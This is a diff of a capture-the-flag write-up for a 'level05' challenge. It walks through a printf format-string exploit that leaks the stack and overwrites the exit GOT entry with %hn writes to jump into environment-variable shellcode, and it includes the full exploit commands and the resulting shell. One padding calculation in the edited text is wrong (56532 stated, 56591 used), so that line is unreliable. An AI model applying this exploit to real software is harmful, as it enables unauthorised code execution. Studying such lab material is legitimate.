@@ -95,7 +95,8 @@ Dump of assembler code for function main:
 End of assembler dump.
 
 *****************************************************************************
-We see that the buffer given to printf isn't protected so we can see the stack.
+We see that the buffer given to printf isn't protected, so we can create any
+format we want to see the stack and write any value in memory.
 *****************************************************************************
 
 level05@OverRide:~$ ./level05
@@ -103,10 +104,10 @@ AAAAAAAAAAAAAAAAAAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
 aaaaaaaaaaaaaaaaaaaa 64 f7fcfac0 f7ec3af9 ffffd6af ffffd6ae 0 ffffffff ffffd734 f7fdb000 61616161 61616161 61616161 61616161 61616161 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520
 
 *****************************************************************************
-We can see that we have our fgets buffer at the 10th position. We will 
-overwrite the exit address of the GOT (global table offset) by a Nop address 
-of our payload placed in an environment variable PAYLOAD. We will utilise
-the '%n' option of printf.
+We can see that we have our fgets buffer at the 10th position on the stack. We
+can now overwrite the address of the exit function in the GOT (global table offset)
+with the address of a nop instruction into our payload, placed in the PAYLOAD
+environment variable. We will utilise the '%n' option of printf to write 4 bytes.
 *****************************************************************************
 
 
@@ -145,14 +146,13 @@ split the %n into two %hn who will write two short to form the complete address.
 So we need to calculate the two padding.
 *****************************************************************************
 
-hexa    dec   hex       dec 
-ffff = 65535 dd17 = 56599
-padding1 = 56599 - 4 - 4 - 59 = 56532
-padding2 = 65535 - 56599 = 8936
-                          4          +     4               + .    59   +  56532 = 56599
-python -c "print('\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%x ' * 8 + '%56532x%n' + '%8936x%n')"
+addr_high (ffff) = 65535 | addr_low (dd17) = 56599
+padding1 = addr_low - 4 - 4 = 56532
+padding2 = addr_high - addr_low = 8936
+											4			+		  4          +  56591 = 56599
+level05@OverRide:~$ python -c "print('\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%56591x%10\$hn' + '%8936x%11\$hn')" > /tmp/exploit
 
-level05@OverRide:~$ python -c "print('\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%56591x%10\$hn' + '%8936x%11\$hn')" > /tmp/exploit ; cat /tmp/exploit - | env -i payload=$(python /tmp/payload.py) ./level05
+level05@OverRide:~$ cat /tmp/exploit - | env -i payload=$(python /tmp/payload.py) ./level05
 ...
 $ pwd
 /home/users/level05
